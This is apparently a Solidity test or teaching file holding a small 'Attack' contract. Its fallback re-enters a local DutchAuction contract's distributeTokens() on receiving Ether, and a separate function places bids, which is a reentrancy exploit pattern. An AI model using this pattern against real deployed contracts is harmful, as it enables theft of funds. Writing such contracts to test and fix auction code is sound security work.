// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./DutchAuction.sol";
import "./AuctionToken.sol";

contract Attack {
    DutchAuction private auctionInstance;

    // Constructor to initialize with the DutchAuction contract address
    constructor(DutchAuction _auctionAddress) {
        auctionInstance = _auctionAddress;
    }

    // Fallback function to handle receiving Ether and call token distribution
    fallback() external payable {
        require(msg.value > 0, "Must send Ether");
        auctionInstance.distributeTokens();
    }

    // Attack function to place bids on the auction
    function executeAttack() external payable {
        require(msg.value > 0, "Must send Ether");
        auctionInstance.placeBid{value: msg.value}();
    }
}
